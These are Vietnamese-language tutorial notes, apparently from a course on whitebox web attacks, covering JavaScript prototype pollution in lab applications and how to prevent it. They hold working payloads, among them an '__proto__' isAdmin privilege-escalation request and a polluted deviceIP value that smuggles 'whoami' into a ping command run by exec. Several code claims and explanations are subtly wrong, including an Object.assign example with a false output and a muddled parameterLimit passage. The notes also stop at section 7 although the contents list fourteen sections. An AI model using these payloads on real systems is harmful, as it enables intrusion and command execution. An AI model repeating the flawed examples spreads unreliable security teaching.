# MỤC LỤC
##  **Tấn công Whitebox và Prototype Pollution**
- [1. Giới thiệu về tấn công Whitebox](#1-giới-thiệu-về-tấn-công-whitebox)
- [2. Đối tượng & nguyên mẫu JavaScript](#2-đối-tượng-nguyên-mẫu-javascript)
- [3. Giới Thiệu về Prototype Pollution](#3-giới-thiệu-về-prototype-pollution)
- [4. Tăng cường đặc quyền thông qua ô nhiễm nguyên mẫu](#4-tăng-cường-đặc-quyền-thông-qua-ô-nhiễm-nguyên-mẫu)
- [5. Phân tích và khai thác lỗi **Prototype Pollution** trong ứng dụng web](#5-phân-tích-và-khai-thác-lỗi-prototype-pollution-trong-ứng-dụng-web)

##  **Code Review và Phòng ngừa**
- [6. Code Review - Xác định Lỗ Hổng](#6-code-review-xác-định-lỗ-hổng)
- [7. Exploitation Remarks & Prevention (Nhận Định Về Việc Khai Thác và Phòng Ngừa)](#7-exploitation-remarks-prevention-nhận-định-về-việc-khai-thác-và-phòng-ngừa)

##  **Điều kiện Cuộc đua và Tấn công Thời gian**
- [8. Giới thiệu về Điều kiện Cuộc đua và Tấn công Thời gian](#8-giới-thiệu-về-điều-kiện-cuộc-đua-và-tấn-công-thời-gian)
- [9. Đếm người dùng qua thời gian phản hồi](#9-đếm-người-dùng-qua-thời-gian-phản-hồi)
- [10. Lộ lọt dữ liệu qua thời gian phản hồi](#10-lộ-lọt-dữ-liệu-qua-thời-gian-phản-hồi)
- [11. Race Conditions trong Ứng dụng Web](#11-race-conditions-trong-ứng-dụng-web)

##  **Type Juggling và Lỗ hổng trong PHP**
- [12. Giới thiệu về Type Juggling (Biến đổi kiểu)](#12-giới-thiệu-về-type-juggling-biến-đổi-kiểu)
- [13. Bỏ qua xác thực với Type Juggling trong PHP](#13-bỏ-qua-xác-thực-với-type-juggling-trong-php)
- [14. Phân tích và Khai thác Lỗ hổng Command Injection qua Type Juggling](#14-phân-tích-và-khai-thác-lỗ-hổng-command-injection-qua-type-juggling)

---
# 1. Giới thiệu về tấn công Whitebox

Trong mô-đun này, chúng ta sẽ tìm hiểu về một số lỗ hổng bảo mật web nâng cao thông qua phương pháp *whitebox* (tấn công từ trong ra ngoài), cùng với cách khai thác chúng. Các lỗ hổng này bao gồm: 

- **Prototype Pollution**
- **Timing Attacks**
- **Race Conditions**
- **Type Juggling**

Để có thể hiểu và khai thác các lỗ hổng này, bạn cần có kiến thức vững về các lỗ hổng web cơ bản và cách khai thác chúng. Một nơi tốt để bắt đầu là mô-đun **Web Attacks**. Trong mô-đun này, chúng ta sẽ chủ yếu tập trung vào việc hiểu rõ nguyên nhân gốc rễ của các lỗ hổng này, thay vì tìm hiểu chi tiết toàn bộ mã nguồn của mỗi ứng dụng web có lỗ hổng. Kiến thức cơ bản về mã nguồn JavaScript, Python và PHP là cần thiết để hoàn thành mô-đun này.

---

### **Whitebox Attacks**

Tấn công *Whitebox* là phương pháp tấn công khi kẻ tấn công có thể truy cập vào mã nguồn hoặc cấu trúc hệ thống của ứng dụng, giúp chúng hiểu sâu về cách ứng dụng hoạt động. Phương pháp này khác với tấn công *Blackbox*, nơi kẻ tấn công không có quyền truy cập vào mã nguồn và chỉ tương tác với ứng dụng qua giao diện người dùng.

---

### **Prototype Pollution**

**Prototype Pollution** là một lỗ hổng bảo mật đặc trưng cho các ngôn ngữ lập trình theo mô hình *prototype-oriented* (theo mẫu đối tượng), như JavaScript. Lỗ hổng này xảy ra khi dữ liệu người dùng được sử dụng để thay đổi các thuộc tính của đối tượng JavaScript. Khi mã không kiểm tra đầu vào đúng cách, kẻ tấn công có thể thao túng đối tượng và dẫn đến các lỗ hổng bảo mật như:

- Tăng quyền (Privilege Escalation)
- Từ chối dịch vụ (Denial-of-Service - DoS)
- Thực thi mã từ xa (Remote Code Execution - RCE)

**Ví dụ:**  
Giả sử một ứng dụng web sử dụng dữ liệu từ người dùng để xây dựng đối tượng JavaScript mà không làm sạch đầu vào. Kẻ tấn công có thể thay đổi prototype của đối tượng và khai thác ứng dụng để chiếm quyền điều khiển.

---

### **Timing Attacks**

**Timing Attacks** là một loại tấn công dựa trên việc phân tích thời gian phản hồi của ứng dụng. Kẻ tấn công có thể lợi dụng sự khác biệt nhỏ trong thời gian xử lý để suy ra thông tin bí mật hoặc khai thác lỗ hổng. Các tấn công này có thể khai thác sự khác biệt trong thời gian mà ứng dụng xử lý dữ liệu, chẳng hạn như trong các kiểm tra xác thực mật khẩu.

**Ví dụ:**  
Nếu một ứng dụng kiểm tra mật khẩu bằng cách so sánh từng ký tự và phản hồi ngay khi ký tự sai, kẻ tấn công có thể đoán được mật khẩu bằng cách phân tích thời gian phản hồi cho mỗi ký tự.

---

### **Race Conditions**

**Race Condition** là một lỗ hổng bảo mật xảy ra khi một ứng dụng xử lý các tác vụ không đồng bộ mà không kiểm soát thứ tự thực thi của các tác vụ đó. Điều này có thể dẫn đến kết quả không mong muốn nếu nhiều tác vụ cố gắng truy cập hoặc thay đổi dữ liệu cùng lúc.

**Ví dụ:**  
Trong một hệ thống thanh toán, nếu một người dùng có thể thực hiện nhiều giao dịch đồng thời mà không có kiểm soát đúng cách, kẻ tấn công có thể lợi dụng tình huống này để thực hiện các giao dịch không hợp lệ.

---

### **Type Juggling**

**Type Juggling** là một vấn đề trong PHP khi các biến được chuyển đổi sang các kiểu dữ liệu khác nhau trong các ngữ cảnh cụ thể. PHP cho phép so sánh lỏng lẻo (sử dụng toán tử `==`), có thể dẫn đến việc so sánh các giá trị sau khi đã chuyển đổi kiểu, thay vì so sánh chính xác với toán tử `===`.

Khi sử dụng so sánh lỏng lẻo mà không cẩn thận, ứng dụng có thể gặp phải các lỗ hổng bảo mật, chẳng hạn như:

- **Bỏ qua xác thực** (Authentication Bypass)
- **Tăng quyền** (Privilege Escalation)

**Ví dụ:**  
Giả sử ứng dụng sử dụng so sánh lỏng lẻo giữa chuỗi và số mà không kiểm tra kiểu dữ liệu, kẻ tấn công có thể lợi dụng điều này để bỏ qua bước xác thực, như khi mật khẩu `0` được coi là hợp lệ thay vì mật khẩu thực sự.

---


# 2. Đối tượng & nguyên mẫu JavaScript

Trước khi tìm hiểu về lỗ hổng **Prototype Pollution**, chúng ta cần hiểu rõ về các đối tượng và **Prototype** trong JavaScript.

---

### **JavaScript Objects**

Trong JavaScript, một đối tượng (object) là một tập hợp các cặp *key-value* (khóa - giá trị). Các giá trị này có thể là bất kỳ kiểu dữ liệu nào, bao gồm cả hàm (function) hoặc các đối tượng khác.

**Ví dụ:**

```javascript
let module = {
  name: "HTB Academy",
  author: "John Doe",
  tier: 3
};
```

Trong ví dụ trên, `module` là một đối tượng có các thuộc tính như `name`, `author`, và `tier`.

---

### **Prototypes in JavaScript**

JavaScript sử dụng một hệ thống kế thừa có sẵn để cung cấp chức năng cơ bản cho tất cả các đối tượng. Hệ thống này được thực hiện thông qua **Object prototypes** (Mẫu đối tượng).

Mỗi đối tượng trong JavaScript có một thuộc tính gọi là **prototype**, mà bản thân nó cũng là một đối tượng. Thuộc tính **prototype** này có thể chứa các thuộc tính hoặc phương thức mà đối tượng đó kế thừa. Mỗi đối tượng sẽ kế thừa các thuộc tính và phương thức từ prototype của nó, và tiếp tục kế thừa từ prototype của prototype, tạo thành một chuỗi gọi là **prototype chain** (chuỗi prototype).

**Ví dụ:**

```javascript
let module = {
  name: "HTB Academy",
  author: "John Doe",
  tier: 3
};

console.log(module.toString());  // Output: "[object Object]"
```

Ở đây, phương thức `toString()` không được định nghĩa trực tiếp trong đối tượng `module`, nhưng nó vẫn có thể sử dụng được. Điều này là vì đối tượng `module` kế thừa phương thức `toString()` từ prototype của nó, tức là từ đối tượng `Object.prototype`.

---

### **Prototype Chain**

Khi bạn cố gắng truy cập một thuộc tính của một đối tượng mà không tồn tại trong chính đối tượng đó, JavaScript sẽ tìm thuộc tính đó trong **prototype** của đối tượng. Nếu không tìm thấy, JavaScript sẽ tiếp tục tìm trong prototype của prototype, và cứ như vậy cho đến khi đến cuối chuỗi prototype. Nếu không tìm thấy thuộc tính ở bất kỳ đâu trong chuỗi prototype, JavaScript sẽ trả về `undefined`.

**Kiểm tra Prototype:**

Để kiểm tra prototype của một đối tượng, bạn có thể truy cập thuộc tính `__proto__`:

```javascript
console.log(module.__proto__);  // Output: Object.prototype
```

Trong trường hợp này, chúng ta có thể thấy rằng prototype của `module` là `Object.prototype`, đây là prototype cơ bản mà tất cả các đối tượng trong JavaScript đều kế thừa.

---

### **Overriding Prototype Properties (Shadowing)**

Bạn có thể ghi đè (override) các thuộc tính hoặc phương thức kế thừa từ prototype để đáp ứng các yêu cầu cụ thể của đối tượng. Điều này gọi là **shadowing** (che khuất).

**Ví dụ:**

```javascript
module.toString = function() {
  return "This is the HTB Academy module: " + this.name;
};

console.log(module.toString());  // Output: "This is the HTB Academy module: HTB Academy"
```

Ở đây, phương thức `toString()` đã được ghi đè để trả về một chuỗi tùy chỉnh thay vì chuỗi mặc định `[object Object]`. Khi gọi `module.toString()`, hàm `toString` mới của đối tượng `module` sẽ được thực thi, thay vì phương thức `toString` kế thừa từ `Object.prototype`.

---

### **Prototype Pollution**

Lỗ hổng **Prototype Pollution** xảy ra khi dữ liệu người dùng được sử dụng để thay đổi các thuộc tính trong prototype của một đối tượng. Điều này có thể dẫn đến các lỗ hổng bảo mật nghiêm trọng, vì kẻ tấn công có thể thay đổi hành vi của các đối tượng trong toàn bộ ứng dụng.

**Ví dụ:**

Giả sử một ứng dụng web cho phép người dùng gửi dữ liệu để tạo đối tượng JavaScript mà không kiểm tra hoặc làm sạch đầu vào. Kẻ tấn công có thể thao túng dữ liệu đầu vào để thay đổi prototype của một đối tượng.

```javascript
// Người dùng cung cấp dữ liệu này
let userInput = { "__proto__.isAdmin": true };

// Áp dụng dữ liệu vào đối tượng
Object.assign(module, userInput);

// Kiểm tra
console.log(module.isAdmin);  // Output: true
```

Trong ví dụ trên, người dùng có thể thay đổi prototype của đối tượng `module`, tạo ra thuộc tính `isAdmin` mà lẽ ra không tồn tại. Điều này có thể dẫn đến những hành vi không mong muốn hoặc các lỗ hổng bảo mật.

---


# 3. Giới Thiệu về Prototype Pollution

Sau khi đã hiểu cách JavaScript khởi tạo các đối tượng và khái niệm về **prototype**, chúng ta sẽ đi vào tìm hiểu về **Prototype Pollution**.

---

### **Prototype Pollution là gì?**

**Prototype Pollution** (Ô nhiễm Prototype) là một lỗ hổng bảo mật xảy ra trong JavaScript khi dữ liệu người dùng có thể thay đổi thuộc tính của prototype (mẫu đối tượng) của một đối tượng. Do prototype của một đối tượng chỉ là một tham chiếu đến một đối tượng khác, chúng ta có thể chỉnh sửa các thuộc tính của prototype giống như việc chỉnh sửa thuộc tính của bất kỳ đối tượng nào, thông qua thuộc tính `__proto__`.

Khi một đối tượng bị ô nhiễm prototype, nó có thể dẫn đến các lỗ hổng bảo mật nghiêm trọng như:

- **Denial-of-Service (DoS)**: Tấn công từ chối dịch vụ.
- **Privilege Escalation**: Tăng quyền không mong muốn.
- **Remote Code Execution (RCE)**: Thực thi mã từ xa.
- Và các lỗ hổng bảo mật khác.

**Ví dụ về ô nhiễm prototype:**

Giả sử chúng ta có đối tượng `module` và muốn thay đổi thuộc tính `toString()` trong prototype của nó:

```javascript
module.__proto__.toString = function () { return "shadowed"; }
```

Sau khi thay đổi thuộc tính này, nếu bạn tạo một đối tượng mới và gọi phương thức `toString()`, đối tượng mới sẽ sử dụng phương thức mà chúng ta đã thay đổi trong prototype:

```javascript
let newObject = new Module();
console.log(newObject.toString());  // Output: "shadowed"
```

Điều này là do tất cả các đối tượng trong JavaScript kế thừa từ `Object.prototype`, và khi chúng ta thay đổi thuộc tính trong prototype này, tất cả đối tượng mới đều kế thừa sự thay đổi.

---

### **Khai Thác Prototype Pollution**

Lỗ hổng **Prototype Pollution** xảy ra khi một hàm không kiểm tra đầu vào đúng cách và cho phép người dùng thay đổi các thuộc tính trong prototype của đối tượng. Lỗi này có thể xảy ra khi dữ liệu người dùng được sử dụng để thiết lập các thuộc tính của đối tượng.

**Ví dụ về mã lỗ hổng:**

Giả sử có một hàm tạo đối tượng `Module`:

```javascript
function Module(name, author, tier) {
  this.name = name;
  this.author = author;
  this.tier = tier;
}
```

Bây giờ, nếu bạn tạo một đối tượng `webAttacks` từ hàm này:

```javascript
var webAttacks = new Module("Web Attacks", "21y4d", 2);
```

Lúc này, `webAttacks` sẽ có các thuộc tính như `name`, `author`, và `tier`. Tuy nhiên, nếu chúng ta có thể thiết lập một thuộc tính tùy ý trong prototype của `webAttacks`, thì chúng ta có thể "ô nhiễm" prototype của đối tượng này, ảnh hưởng đến tất cả các đối tượng JavaScript mới.

**Ví dụ về tấn công Prototype Pollution:**

Giả sử chúng ta muốn ô nhiễm thuộc tính `academy` trong prototype của `webAttacks`. Ta có thể làm như sau:

```javascript
webAttacks.__proto__.__proto__.academy = "polluted";
```

Lúc này, mọi đối tượng mới được khởi tạo sẽ kế thừa thuộc tính `academy` mà ta đã thêm vào prototype:

```javascript
let newObject = new Module("New Object", "Author", 1);
console.log(newObject.academy);  // Output: "polluted"
```

---

### **Các Lỗ Hổng Prototype Pollution**

Các lỗ hổng **Prototype Pollution** xảy ra chủ yếu khi dữ liệu người dùng được sử dụng để thiết lập các thuộc tính của đối tượng mà không có kiểm tra đúng cách. Trong một ứng dụng web, nếu người dùng có thể gửi JSON để cập nhật đối tượng, và không có biện pháp bảo vệ, thì rất có thể lỗ hổng này sẽ xảy ra.

**Ví dụ về một hàm có lỗ hổng Prototype Pollution:**

Giả sử một ứng dụng web cho phép người dùng gửi dữ liệu dưới dạng JSON để cập nhật đối tượng `module`, như sau:

```javascript
function merge(target, source) {
  for (let key in source) {
    if (isObject(target[key]) && isObject(source[key])) {
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

Nếu hàm này không kiểm tra dữ liệu đầu vào đúng cách, một người dùng có thể gửi JSON như sau:

```json
{"__proto__": {"poc": "pwned"}}
```

Khi dữ liệu này được hợp nhất vào đối tượng mà không có kiểm tra đầu vào, prototype của đối tượng sẽ bị ô nhiễm. Các đối tượng mới được tạo ra sẽ có thuộc tính `poc` kế thừa từ prototype:

```javascript
let newObject = new Module("New Object", "Author", 1);
console.log(newObject.poc);  // Output: "pwned"
```

---


# 4. Tăng cường đặc quyền thông qua ô nhiễm nguyên mẫu

Trong phần này, chúng ta sẽ tìm hiểu về một ứng dụng web dễ bị tấn công thông qua **Prototype Pollution** dẫn đến **Privilege Escalation** (leo thang quyền). Mục tiêu là phát hiện lỗ hổng bảo mật này thông qua việc phân tích mã nguồn ứng dụng web và tạo ra một phương pháp khai thác để leo thang quyền.

---

### **Xem Xét Mã Nguồn - Phát Hiện Lỗ Hổng**

Để xác định lỗ hổng **Prototype Pollution**, chúng ta bắt đầu bằng cách xem xét các phụ thuộc (dependencies) trong tệp `package.json`. Đây là nơi quản lý các thư viện được cài đặt thông qua **npm**, trình quản lý gói cho Node.js.

#### Các phụ thuộc của ứng dụng:
```json
"dependencies": {
  "bcryptjs": "^2.4.3",
  "cookie-parser": "^1.4.6",
  "express": "^4.18.2",
  "jsonwebtoken": "^9.0.0",
  "jsrender": "^1.0.12",
  "nodemon": "^2.0.20",
  "path": "^0.12.7",
  "sequelize": "^6.28.0",
  "sqlite3": "^5.1.4",
  "node.extend": "1.1.6"
}
```

#### Phát hiện lỗ hổng **Prototype Pollution**:
Chúng ta chú ý đến thư viện `node.extend`, một thư viện thực hiện việc **hợp nhất (merge)** các đối tượng. Một số phiên bản của `node.extend` có lỗ hổng **Prototype Pollution**, và phiên bản 1.1.6 mà ứng dụng này sử dụng là một trong những phiên bản dễ bị tấn công (CVE-2018-16491).

---

### **Phân Tích Lỗi và Khai Thác**

Tiếp theo, chúng ta cần kiểm tra xem liệu người dùng có thể cung cấp dữ liệu để khai thác lỗ hổng này không. Cụ thể, trong tệp `utils/log.js`, thư viện `node.extend` được sử dụng để hợp nhất các đối tượng, trong đó có thể có các dữ liệu từ người dùng:

```javascript
const extend = require("node.extend");
const log = (request) => {
  var log = extend(true, {date: Date.now()}, request);
  console.log("## Login activity: " + JSON.stringify(log));
}
module.exports = { log };
```

Hàm `log` này được gọi từ route `/login` và nhận đầu vào là `req.body` (dữ liệu gửi từ phía người dùng). Nếu người dùng gửi một **payload** có chứa thuộc tính `__proto__`, lỗ hổng **Prototype Pollution** sẽ xảy ra.

#### Tìm Đầu Vào Người Dùng:
Ta tìm kiếm trong mã nguồn và xác định rằng hàm `log` được gọi tại route `/login` trong tệp `routes/index.js`:

```javascript
router.post("/login", async (req, res) => {
  // log all login attempts for security purposes
  log(req.body);
  <SNIP>
}
```

---

### **Chạy Ứng Dụng Web Loca**

Trước khi thực hiện khai thác, chúng ta cần chạy ứng dụng web cục bộ để xác nhận sự tồn tại của lỗ hổng và kiểm tra các bước khai thác. Cài đặt Node.js và `npm` là cần thiết để cài các phụ thuộc.

- Cài đặt Node.js: 
  ```bash
  sudo apt install npm
  ```
- Cài đặt các phụ thuộc:
  ```bash
  npm install
  ```

Sau khi chạy ứng dụng web, chúng ta có thể kiểm tra xem liệu có thể đăng nhập và truy cập trang admin hay không.

---

### **Xác Nhận Lỗ Hổng và Thực Hiện Tấn Công**

Khi đã xác nhận rằng chúng ta có thể đăng nhập vào ứng dụng, ta tiếp tục tìm cách tấn công vào trang admin để leo thang quyền. Một trong các cách là lợi dụng việc **Prototype Pollution** để thao túng quyền truy cập vào trang admin, dù chúng ta không phải là người dùng admin.

#### Phát Hiện Lỗ Hổng Quản Lý Phiên Đăng Nhập:
Trong quá trình kiểm tra mã nguồn của route `/admin`, chúng ta nhận thấy rằng ứng dụng sử dụng một **JWT** (JSON Web Token) để kiểm tra xem người dùng có quyền truy cập vào trang admin không. Tuy nhiên, nếu không có thông tin về quyền admin trong JWT, hệ thống sẽ mặc định sử dụng giá trị `false`.

---

### **Khai Thác Prototype Pollution**

Để khai thác lỗ hổng này, ta có thể sử dụng **Prototype Pollution** để thêm thuộc tính `isAdmin` vào `Object.prototype`. Khi đó, bất kỳ đối tượng nào được tạo ra đều sẽ có thuộc tính `isAdmin = true` nếu truy cập qua prototype.

#### Các Bước Thực Hiện:

1. **Khai thác thông qua Payload**: Gửi một yêu cầu **POST** đến route `/login` với payload như sau:
   ```json
   {
     "__proto__": {
       "isAdmin": true
     }
   }
   ```

2. **Xác Nhận**: Khi payload này được hợp nhất vào đối tượng, thuộc tính `isAdmin` sẽ được thêm vào prototype của các đối tượng mới, bao gồm đối tượng `session` của người dùng. Điều này dẫn đến việc người dùng có quyền truy cập vào trang admin.

3. **Thực Hiện Tấn Công**: Khi chúng ta thực hiện yêu cầu này, ứng dụng sẽ không nhận ra rằng người dùng không phải là admin, do thuộc tính `isAdmin` đã được thêm vào prototype, cho phép chúng ta truy cập vào trang quản trị mà không cần phải đăng nhập với quyền admin thực sự.

---


# 5. Phân tích và khai thác lỗi **Prototype Pollution** trong ứng dụng web

Trong phần này, chúng ta sẽ tiếp tục nghiên cứu về cách khai thác lỗi **Prototype Pollution** trong một ứng dụng web để thực hiện tấn công **Command Injection**. Chúng ta sẽ tìm hiểu mã nguồn của ứng dụng, xác định các lỗ hổng và phát triển một exploit để thực hiện việc leo thang quyền truy cập hoặc điều khiển hệ thống.

#### 1. **Phát hiện lỗ hổng Prototype Pollution trong ứng dụng**

Đầu tiên, chúng ta tìm thấy một đoạn mã trong `routes/index.js` có khả năng bị tấn công bằng cách sử dụng **Prototype Pollution**. Cụ thể, trong endpoint `/ping`, có một đoạn mã sử dụng hàm `exec` để thực thi lệnh hệ thống mà không kiểm tra đúng cách đối với đầu vào từ người dùng:

```js
exec(`ping -c 1 ${userObject.deviceIP}`, (error, stdout, stderr) => {
    return res.render("ping", { ping_result: stdout.replace(/\n/g, "<br/>") + stderr.replace(/\n/g, "<br/>") });
});
```

Hàm `exec` thực thi lệnh `ping` với thông tin IP được lấy từ `userObject.deviceIP`. Nếu không có biện pháp lọc đầu vào phù hợp, kẻ tấn công có thể chèn mã độc vào trường `deviceIP` và thực thi các lệnh hệ thống thông qua lỗ hổng **Command Injection**.

#### 2. **Lỗ hổng Prototype Pollution trong hàm `merge`**

Trong endpoint `/update`, hàm `merge` của thư viện **lodash** được sử dụng để hợp nhất dữ liệu đầu vào từ người dùng vào đối tượng `userObject`. Tuy nhiên, phiên bản **lodash.merge** mà ứng dụng đang sử dụng có lỗ hổng **Prototype Pollution**:

```js
_.merge(userObject, req.body);
```

Điều này cho phép kẻ tấn công thay đổi các thuộc tính trong **prototype** của đối tượng, bao gồm `User.prototype.deviceIP`, mà không cần phải cung cấp một giá trị hợp lệ cho `deviceIP`. Thay vì chỉ thay đổi giá trị của `deviceIP`, kẻ tấn công có thể thay đổi thuộc tính này trong **prototype**, dẫn đến khả năng chèn lệnh vào khi hàm `exec` được gọi.

#### 3. **Khai thác lỗi Prototype Pollution để thực hiện Command Injection**

Khi tiến hành khai thác, kẻ tấn công sẽ thực hiện các bước sau:

- Đăng ký một người dùng mới mà không cung cấp giá trị cho `deviceIP` (mặc định là `null`).
- Sau đó, họ gửi một yêu cầu cập nhật profile người dùng với một payload **Prototype Pollution** để chèn một giá trị lệnh vào `deviceIP`:

```json
{
  "__proto__": {
    "deviceIP": "127.0.0.1; whoami"
  }
}
```

Payload này sẽ không bị lọc bởi vì nó sử dụng thuộc tính `__proto__` để thay đổi prototype của đối tượng, khiến lệnh `whoami` được thực thi khi hàm `ping` gọi `exec`.

#### 4. **Xác nhận và thực hiện tấn công**

Khi tấn công thành công, hệ thống sẽ thực thi lệnh `whoami` và trả về kết quả trên giao diện web trong trang `/ping`, chứng tỏ rằng **Command Injection** đã thành công.

---

# 6. Code Review - Xác định Lỗ Hổng

Phần này sẽ hướng dẫn cách nhận diện lỗ hổng *prototype pollution* phía client mà không cần truy cập vào mã nguồn của ứng dụng web, chỉ tập trung vào mã nguồn frontend. Khi bắt đầu với mục tiêu của bài lab, chúng ta có thể nhận thấy đây là một ứng dụng PHP nhờ vào phần mở rộng `.php` trong tham số `color`. Tuy nhiên, tham số này đã được làm sạch đúng cách bằng **DOMPurify**, giúp ngăn ngừa các lỗ hổng XSS. Tuy vậy, nếu chúng ta tìm kiếm các lỗ hổng *prototype pollution* trong các thư viện client-side, chúng ta sẽ phát hiện ra một vấn đề.

**Ví dụ:**  
Chúng ta thấy rằng thư viện **jQuery-deparam** có lỗ hổng *prototype pollution*. Để kiểm tra, chúng ta có thể sử dụng PoC (Proof of Concept) có sẵn trên trang GitHub để kích hoạt lỗ hổng *prototype pollution* bằng cách truy cập vào URL sau:

```
/profile.php?__proto__[poc]=polluted
```

Sau khi truy cập URL này, chúng ta có thể mở công cụ **JavaScript console** trong trình duyệt (ấn **F12**) và xác nhận lỗ hổng *prototype pollution* bằng cách kiểm tra đối tượng `Object.prototype`.

---

### **Công Cụ Hỗ Trợ**

Sau khi đã thảo luận về cách nhận diện và khai thác các lỗ hổng *prototype pollution* phía client, chúng ta sẽ tìm hiểu một công cụ hỗ trợ rất hữu ích trong quá trình này, đó là **DOM Invader**, một công cụ tích hợp trên Burp Suite.

Để sử dụng **DOM Invader**, chúng ta cần khởi động trình duyệt **Chromium** tích hợp trong **Burp Suite**. Phần mở rộng **DOM Invader** sẽ được cài đặt tự động. Các bước để sử dụng công cụ này như sau:

1. **Mở Burp Suite**: Chúng ta vào phần *Extensions* ở thanh URL của Burp Suite và ghim biểu tượng **Burp Suite Extension**.
2. **Kích hoạt DOM Invader**: Nhấn vào biểu tượng **Burp Suite Extension**, sau đó vào tab **DOM Invader** và bật tính năng này.
3. **Chọn Loại Tấn Công**: Vào phần **Attack types** và kích hoạt **Prototype Pollution**.
4. **Tải lại Trang**: Nhấn **Reload** và truy cập vào trang có lỗ hổng, trong ví dụ này là `/profile.php`.

Khi đó, **DOM Invader** sẽ tự động kiểm tra trang này để tìm kiếm các lỗ hổng *prototype pollution*. Kết quả kiểm tra sẽ hiển thị trong tab **DOM Invader** sau khi chúng ta mở công cụ phát triển trình duyệt (ấn **F12**).

---

### **Khai Thác và Xác Nhận Vulnerability**

Trong ứng dụng mẫu của chúng ta, **DOM Invader** phát hiện được lỗ hổng *prototype pollution* đã được đề cập trước đó. Tuy nhiên, công cụ này cung cấp hai vector khai thác có thể, sử dụng `constructor[prototype]`. Chúng ta có thể nhấp vào `__proto__` và thử nghiệm với các lỗ hổng để xác nhận chúng.

**Ví dụ:**  
URL bị tấn công sẽ được mở trong một tab mới, và chúng ta có thể hiển thị đối tượng `Object.prototype` trong console JavaScript để xác nhận rằng lỗ hổng *prototype pollution* đã xảy ra. Khi quan sát đối tượng này, chúng ta sẽ thấy các thay đổi không mong muốn được tạo ra bởi dữ liệu bị ô nhiễm.

---

### **Tìm Kiếm Script Gadgets**

Cuối cùng, **DOM Invader** có thể giúp tìm các *script gadgets* cho phép chúng ta biến lỗ hổng *prototype pollution* thành một lỗ hổng XSS. Để làm điều này, chúng ta có thể nhấn **Scan for gadgets** để **DOM Invader** tìm kiếm các *script gadgets* có thể khai thác. Sau khi quá trình quét hoàn tất, kết quả sẽ được hiển thị trong tab **DOM Invader** của công cụ phát triển trình duyệt. Tuy nhiên, trong ví dụ này, **DOM Invader** không phát hiện ra vector XSS mà chúng ta đã khai thác trước đó.

**Ví dụ:**  
Nếu **DOM Invader** phát hiện được một *script gadget*, chúng ta có thể thử khai thác để chuyển lỗ hổng *prototype pollution* thành XSS. Tuy nhiên, trong trường hợp này, không có lỗ hổng XSS nào được phát hiện, cho thấy rằng mặc dù lỗ hổng *prototype pollution* tồn tại, nhưng không thể chuyển nó thành XSS.

---


# 7. Exploitation Remarks & Prevention (Nhận Định Về Việc Khai Thác và Phòng Ngừa)

Bây giờ chúng ta đã cùng tìm hiểu và khai thác các lỗ hổng *prototype pollution*, hãy thảo luận về những nhận định quan trọng khi xác định và khai thác chúng trong môi trường thực tế. Bên cạnh đó, phần này sẽ kết thúc với các phương pháp phòng ngừa các lỗ hổng *prototype pollution*.

---

### **Exploitation Remarks (Nhận Định Khi Khai Thác)**

Như đã đề cập trước đó, việc ô nhiễm các prototype có thể dẫn đến các tác dụng phụ không mong muốn, có thể làm hỏng toàn bộ ứng dụng web. Do đó, không nên đơn giản tấn công một ứng dụng web sản xuất bằng cách gửi các payload *prototype pollution* và hy vọng sẽ thành công. **Kiểm tra và điều chỉnh payload** *prototype pollution* trên bản sao cục bộ của ứng dụng web là điều được khuyến cáo.

Mặc dù trong mô-đun này chúng ta tập trung vào việc phát hiện và khai thác các lỗ hổng *prototype pollution* từ phương pháp **whitebox**, nhưng trong thực tế, chúng ta không phải lúc nào cũng có quyền truy cập vào mã nguồn của ứng dụng web mục tiêu và cần phải có khả năng nhận diện chúng bằng phương pháp **black-box**. May mắn thay, một số kỹ thuật có thể giúp phát hiện *prototype pollution* một cách an toàn theo phương pháp **black-box**.

---

### **Các Kỹ Thuật Phát Hiện Prototype Pollution**

1. **Status Code (Mã Trạng Thái)**

Kỹ thuật đầu tiên và phổ biến nhất là **manipulating the status code** (tác động vào mã trạng thái trả về khi ứng dụng web gặp sự cố). Trước tiên, chúng ta cần xác định cách ứng dụng web phản hồi khi nhận được một yêu cầu JSON không hợp lệ. Ví dụ, nếu ứng dụng trả về mã trạng thái HTTP **400**, điều này có thể là dấu hiệu cho thấy ứng dụng không xử lý đúng dữ liệu.

Để xác nhận *prototype pollution*, chúng ta có thể tác động vào mã trạng thái bằng cách **ô nhiễm thuộc tính `status`** của đối tượng `Object.prototype` bằng cách sử dụng một payload giống như sau:

```javascript
{"__proto__":{"status":"polluted"}}
```

Tùy thuộc vào cách triển khai của ứng dụng, chúng ta có thể cần phải đi qua nhiều bước trong chuỗi prototype để có thể ô nhiễm đúng thuộc tính `status`.

---

2. **Parameter Limiting (Giới Hạn Tham Số)**

Kỹ thuật thứ hai yêu cầu ứng dụng web có một điểm kết nối (endpoint) phản ánh tham số **GET** theo một cách nào đó. Ví dụ, trong trường hợp đơn giản sau, thân của phản hồi phản ánh các tham số **GET** dưới dạng một đối tượng **JSON**:

```json
{
    "param1": "value1",
    "param2": "value2"
}
```

Chúng ta có thể thay đổi số lượng tham số **GET** được phản hồi bằng cách ô nhiễm thuộc tính `parameterLimit` của đối tượng `Object.prototype`. Nếu chúng ta gửi chuỗi thử nghiệm này tới ứng dụng, nó sẽ phản ánh chính xác như sau mà không bị giải mã **UTF-7**:

```javascript
{"__proto__":{"parameterLimit":1000}}
```

Chúng ta có thể thao tác với giá trị của **Content-Type Header** được sử dụng bởi ứng dụng bằng cách ô nhiễm thuộc tính `content-type` của `Object.prototype`.

---

### **Phòng Ngừa Prototype Pollution**

Để ngăn ngừa các lỗ hổng *prototype pollution*, có một số phương pháp bảo mật mà các nhà phát triển có thể áp dụng:

1. **Sanitizing Keys (Làm Sạch Các Khóa)**

Cách rõ ràng nhất là làm sạch các khóa để đảm bảo rằng kẻ tấn công không thể tiêm các khóa tham chiếu đến prototype. Tuy nhiên, mặc dù cách tiếp cận này có vẻ đơn giản, việc triển khai một công cụ làm sạch như vậy không phải là điều dễ dàng. Như đã thấy trong các phần trước, việc chỉ chặn khóa `__proto__` là không đủ để ngăn chặn hoàn toàn *prototype pollution*. Có thể kẻ tấn công sẽ sử dụng các khóa khác như `constructor` hoặc `prototype` để tham chiếu tới prototype.

Do đó, công cụ làm sạch nên ít nhất phải chặn ba khóa: `__proto__`, `constructor`, và `prototype`. Một cách tiếp cận bảo mật hơn là sử dụng **whitelist** (danh sách cho phép), trong đó chỉ những khóa được liệt kê rõ ràng mới được phép sử dụng trong ứng dụng. Các khóa này cần được chọn lựa cẩn thận tùy theo ngữ cảnh và có thể giúp ngăn chặn các lỗ hổng khác như **Mass Assignment**.

